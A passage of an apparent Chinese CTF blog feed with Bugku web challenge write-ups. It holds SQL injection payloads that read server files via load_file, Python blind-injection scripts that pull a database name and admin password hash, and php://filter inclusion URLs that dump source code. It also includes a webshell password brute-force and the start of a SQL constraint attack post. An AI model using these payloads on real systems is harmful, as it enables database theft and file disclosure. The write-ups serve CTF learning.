class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/131.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id,title</p><p>爆数据，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(title)%0afrom%0atemp),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/132.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没发现flag…</p><p>说明flag不在数据库里，回到题目页面，又看到了提示，查询文件在/var/test/key_1.php </p><p>说明可能要用mysql的load_file函数读取文件内容，再通过hex函数转化为十六进制数</p><p>输入?id=1%0aand%0aextractvalue(1,concat(0x3a,hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/133.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到没有全部读取，这就是extractvalue函数的缺点，只能读取32位</p><p>这时候就需要利用substr函数每次截取30位读</p><p>先读取前30位</p><p>输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30),0x3a))%23</p><p>再读取31~60位，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30),0x3a))%23</p><p>依次类推</p><p>最后得到298位十六进制数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3C3F70687020666473616661736664736166696473616664736169666473616B666473616966647361666473616664736166647361666B6473613B6664736166647361667364616664736166617330686664736739466C61673A22373234396635613766643164653630326233306536663339616561363139336122667364616673616664736166647361666473616661203F3E0A</span><br></pre></td></tr></table></figure><p>转化成字符串得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:<span class="string">"7249f5a7fd1de602b30e6f39aea6193a"</span>fsdafsafdsafdsafdsafa <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到 Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p><h3 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49167/" target="_blank" rel="noopener">http://118.89.219.210:49167/</a></p><p>登录界面，随便输入一个用户名1，密码1，提示用户名不存在，输入admin,密码1，提示密码错误，猜测有检查用户名是否存在的判断，猜测注入点在admin,输入admin’，提示用户不存在，输入admin’#，提示密码错误，很显然admin被单引号包裹</p><p>那么理清思路，这是字符型注入，注入点在admin,admin被单引号包裹，题目提示我们这是一题基于布尔的盲注</p><p>那么我们试试输入admin’ and 1=1#，发现提示了出现非法字符,oh no ，我们直接输入and，同样提示出现非法字符，看来and被过滤了，那不用and了，我们用异或^</p><p>输入admin’^1#，提示用户名不存在，输入admin’^0#，提示密码错误，很好，那么就可以利用这个提示信息进行基于布尔的盲注</p><p>接下来就是搞定逻辑语句了，正常来说我们是用语句ascii(substr(database(),1,1))=数字，但是尝试就发现了，这题还过滤了逗号，等号，等号可以用不等号&lt;&gt;代替，那么用ascii(substr(database() from 1 for 1))=数字，这样可以吗，又发现for和空格被过滤了…</p><p>怎么办，借鉴了别人的思路，才发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/134.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值</p><p>那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第数字1位的ascii值</p><p>直接上脚本，注出数据库名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.219.210:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure><p>数据库名：blindsql</p><p>本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜</p><p>看别人猜的表名为admin，列名为password，真是玄学…</p><p>那就直接爆password：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.219.210:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of password is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>得password：51b7a76d51e70b419f60d3473fb6f900</p><p>还得拿去md5解密，解密得skctf123456</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/135.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>网址：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p><p>啥提示都没有，只有url有个提示webshell，试着扫一下后台</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/136.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现shell.php</p><p>进去要输入密码才能看到flag，不是sql，只能burp爆破密码，爆破出来密码是hack</p><h3 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h3><p>网址：<a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a></p><p>看着像是sql二次注入，但是死活找不到注入点，id一直不知道处理，试着扫一下后台</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/137.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问一下show.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/138.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>直接给出了flag</p><h3 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h3><p>网址：<a href="http://120.24.86.145:9011/" target="_blank" rel="noopener">http://120.24.86.145:9011/</a></p><p>看页面像是文件上传，但是尝试上传png文件，jpg文件都上传不了，再看看url有个op参数，看着有点像是文件包含，试着用php伪协议读一下文件看看能不能读出来，payloads:</p><p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index</a></p><p>这里不用加php后缀名，读出了index.php的base64源码</p><p>base64解码得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">'FROM_INDEX'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$op = <span class="keyword">empty</span>($_GET[<span class="string">'op'</span>]) ? <span class="string">'home'</span> : $_GET[<span class="string">'op'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_string($op) || preg_match(<span class="string">'/\.\./'</span>, $op))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try it again and I will kill you! I freaking hate hackers!'</span>);</span><br><span class="line">ob_start(<span class="string">'ob_gzhandler'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_top</span><span class="params">($op)</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Panduploader::<span class="meta">&lt;?</span>= htmlentities(ucfirst($op)); <span class="meta">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">"header"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href="?op=home" class="logo"&gt;&lt;img src="images/logo.jpg" alt=""&gt;&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"body"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fatal</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">?&gt;&lt;div class="article"&gt;</span><br><span class="line">&lt;h2&gt;Error&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?</span>=$msg;<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_bottom</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">&lt;div id=<span class="string">"footer"</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;span&gt;<span class="number">2017</span> &amp;copy; &lt;/span&gt; All rights reserved.</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;<span class="meta">&lt;?php</span></span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_shutdown_function(<span class="string">'page_bottom'</span>);</span><br><span class="line"></span><br><span class="line">page_top($op);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">include</span> $op . <span class="string">'.php'</span>))</span><br><span class="line">    fatal(<span class="string">'no such page'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再读取home.php，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;Welcome!!&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        We let you upload PNG image files <span class="keyword">and</span> store it!&lt;br/&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        Get started by &lt;a href=<span class="string">"?op=upload"</span>&gt;uploading a picture&lt;/a&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>发现又包含了common.php，不急，先读upload.php的源代码，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; <span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>])) &#123;</span><br><span class="line">    $fn = $_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $ft = $_FILES[<span class="string">'image'</span>][<span class="string">'type'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_uploaded_file($fn)) &#123;</span><br><span class="line">        fatal(<span class="string">'uploaded file corrupted'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = <span class="keyword">array</span>(<span class="string">'image/png'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ft,$array))&#123;</span><br><span class="line">        fatal(<span class="string">"Sorry, only PNG files are allowed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $imagekey = create_image_key();</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($fn, <span class="string">"uploads/$imagekey.png"</span>);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: ?op=show&amp;imagekey=$imagekey"</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;Upload your own png file&lt;/h2&gt;</span><br><span class="line">    &lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"?op=upload"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">"image"</span>&gt;Image file (max <span class="meta">&lt;?</span>=MAX_IM_SIZE;<span class="meta">?&gt;</span>x<span class="meta">&lt;?</span>=MAX_IM_SIZE;<span class="meta">?&gt;</span>): &lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">"file"</span> id=<span class="string">"image"</span> name=<span class="string">"image"</span> /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Upload!"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看一下common.php，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'FROM_INDEX'</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MAX_IM_SIZE'</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . time() . mt_rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span><span class="params">($imagekey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">'/[0-9a-f]&#123;40&#125;/'</span>, $imagekey)) &#123;</span><br><span class="line">        fatal(<span class="string">'Invalid image key.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $im = imagecreatefrompng(<span class="string">"uploads/&#123;$imagekey&#125;.png"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$im) &#123;</span><br><span class="line">        fatal(<span class="string">'Failed to load image.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $im;</span><br><span class="line">&#125;</span><br><span class="line">stream_wrapper_unregister (<span class="string">"zip"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出我们上传文件首先对上传文件类型进行检查，检查是不是png类型的文件，如果是，则重定向到show.php</p><p>那么我们再看看show.php的源代码</p><p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'imagekey'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: ?op=home'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagekey = $_GET[<span class="string">'imagekey'</span>];</span><br><span class="line">$im = load_image($imagekey);</span><br><span class="line"></span><br><span class="line">$w = imagesx($im);</span><br><span class="line">$h = imagesy($im);</span><br><span class="line"><span class="keyword">if</span>($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE)</span><br><span class="line">    fatal(<span class="string">"Invalid image dimensions."</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&lt;img src=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span> /&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;a href=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span>&gt;View saved image&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>看不出所以然，即使最后上传成功文件，也没显示flag，那么直接输入op=flag，发现没有提示错误，说明有这个文件，那么就同样利用php://filter读取源代码</p><p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag</a></p><p>解码得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag=<span class="string">"flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Bugkuctf-Web
    
    </summary>
    
      <category term="Bugkuctf-Web" scheme="https://Foxgrin.github.io/categories/Bugkuctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sql约束攻击</title>
    <link href="https://Foxgrin.github.io//posts/22848/"/>
    <id>https://Foxgrin.github.io//posts/22848/</id>
    <published>2018-08-04T08:58:00.000Z</published>
    <updated>2018-08-06T03:45:00.811Z</updated>
    
    <content type="html"><![CDATA[<p>做ctf的题时刚好做到要用sql约束攻击的题，赶紧去看看别人的文章学习一下这种攻击<a id="more"></a></p><p>题目大致上是一个登陆界面和一个注册界面，需要我们用管理员的身份登陆才能拿到flag值</p><p>登陆页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'connection.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT username,password FROM users WHERE username='$username' AND password='$password'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello '</span>.$username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'username was not exist or password was wrong'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注册页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'connection.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">$username = mysql_real_escape_string($_POST[<span 